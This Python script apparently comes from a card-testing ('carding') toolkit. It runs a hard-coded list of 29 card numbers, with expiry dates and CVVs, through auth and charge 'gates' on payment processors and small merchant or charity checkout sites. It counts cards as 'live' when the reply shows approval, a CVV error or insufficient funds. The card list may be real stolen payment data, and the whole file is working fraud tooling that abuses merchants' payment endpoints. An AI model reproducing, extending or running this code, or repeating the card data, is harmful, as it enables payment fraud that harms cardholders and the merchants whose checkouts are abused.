#!/usr/bin/env python3
"""
Batch Gate Test - Tests all cards through all gates
"""
import warnings
warnings.filterwarnings('ignore')

import sys
import os
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

CARDS = [
    ("5350160566324809", "01", "26", "519"),
    ("5502096147527790", "09", "30", "463"),
    ("4108634490168621", "07", "28", "884"),
    ("5234211922588868", "08", "27", "745"),
    ("4108639615799085", "05", "28", "737"),
    ("4305350036346131", "06", "27", "900"),
    ("5226880771758218", "02", "30", "622"),
    ("5162929105072907", "07", "30", "847"),
    ("4593150390664801", "06", "27", "526"),
    ("4984423523765275", "10", "27", "976"),
    ("5502098162982769", "06", "29", "015"),
    ("4108634077470101", "12", "28", "517"),
    ("5502092742027732", "07", "27", "024"),
    ("4329584362397019", "02", "26", "791"),
    ("4568580858619106", "04", "27", "748"),
    ("5447313442037054", "02", "28", "396"),
    ("4705980035713430", "07", "28", "458"),
    ("4350870174535611", "03", "26", "483"),
    ("2231151331895027", "10", "29", "818"),
    ("4108633909479009", "01", "28", "197"),
    ("5502097337051161", "10", "27", "997"),
    ("4078430021923956", "07", "27", "963"),
    ("5502095397377385", "09", "29", "744"),
    ("5162926744371005", "07", "29", "319"),
    ("4984082028489557", "11", "27", "824"),
    ("4984011104949390", "02", "28", "029"),
    ("5502092934683292", "03", "29", "625"),
    ("5447318309483648", "05", "26", "117"),
    ("4763336209229118", "01", "28", "034"),
]

def test_gate(gate_name, gate_func, cards):
    print(f"\n{'='*60}")
    print(f"  TESTING: {gate_name}")
    print(f"{'='*60}")
    
    stats = {"live": 0, "declined": 0, "error": 0}
    
    for card in cards:
        cc, mm, yy, cvv = card
        card_display = f"{cc[:6]}...{cc[-4:]}"
        
        try:
            if "lions" in gate_name.lower():
                result = gate_func(cc, mm, yy, cvv, None)
            else:
                result = gate_func(cc, mm, yy, cvv)
            
            response = str(result[0]) if isinstance(result, tuple) else str(result)
            resp_upper = response.upper()
            
            if any(x in resp_upper for x in ["CHARGED", "APPROVED", "SUCCESS", "CCN LIVE", "TOKENIZED", "3DS PASS"]):
                stats["live"] += 1
                marker = "[+]"
            elif any(x in resp_upper for x in ["CVV", "CVC", "INCORRECT", "NSF", "INSUFFICIENT"]):
                stats["live"] += 1
                marker = "[~]"
            elif "DECLINED" in resp_upper or "FAILED" in resp_upper:
                stats["declined"] += 1
                marker = "[-]"
            else:
                stats["error"] += 1
                marker = "[?]"
            
            print(f"  {marker} {card_display}: {response[:70]}")
            
        except Exception as e:
            stats["error"] += 1
            print(f"  [!] {card_display}: ERROR - {str(e)[:50]}")
        
        time.sleep(0.3)
    
    total = len(cards)
    print(f"\n  SUMMARY: {stats['live']}/{total} live ({stats['live']/total*100:.1f}%), {stats['declined']} declined, {stats['error']} errors")
    return stats


def main():
    print("=" * 60)
    print("  COMPREHENSIVE GATE TEST")
    print(f"  Testing {len(CARDS)} cards")
    print("=" * 60)
    
    results = {}
    
    # AUTH GATES
    print("\n### AUTH GATES ###")
    
    try:
        from gates.pariyatti_auth import pariyatti_auth_check
        results["pariyatti_auth"] = test_gate("pariyatti_auth", pariyatti_auth_check, CARDS)
    except Exception as e:
        print(f"[!] pariyatti_auth load error: {e}")
    
    try:
        from gates.stripe_auth_epicalarc import stripe_auth_epicalarc_check
        results["stripe_epicalarc"] = test_gate("stripe_epicalarc", stripe_auth_epicalarc_check, CARDS)
    except Exception as e:
        print(f"[!] stripe_epicalarc load error: {e}")
    
    try:
        from gates.stripe_js import stripe_js_check
        results["stripe_js"] = test_gate("stripe_js", stripe_js_check, CARDS)
    except Exception as e:
        print(f"[!] stripe_js load error: {e}")
    
    try:
        from gates.braintree import braintree_check
        results["braintree"] = test_gate("braintree", braintree_check, CARDS)
    except Exception as e:
        print(f"[!] braintree load error: {e}")
    
    # CHARGE GATES
    print("\n### CHARGE GATES ###")
    
    try:
        from gates.lions_club import lions_club_check
        results["lions_club"] = test_gate("lions_club", lions_club_check, CARDS)
    except Exception as e:
        print(f"[!] lions_club load error: {e}")
    
    try:
        from gates.tsa_charge import tsa_check
        results["tsa_charge"] = test_gate("tsa_charge", tsa_check, CARDS)
    except Exception as e:
        print(f"[!] tsa_charge load error: {e}")
    
    try:
        from gates.stripe_sk_charge import stripe_sk_charge
        results["stripe_sk_charge"] = test_gate("stripe_sk_charge", stripe_sk_charge, CARDS)
    except Exception as e:
        print(f"[!] stripe_sk_charge load error: {e}")
    
    # Final summary
    print("\n" + "=" * 60)
    print("  FINAL RESULTS")
    print("=" * 60)
    for gate, stats in results.items():
        total = stats["live"] + stats["declined"] + stats["error"]
        print(f"  {gate}: {stats['live']}/{total} live ({stats['live']/total*100:.1f}%)")


if __name__ == "__main__":
    main()
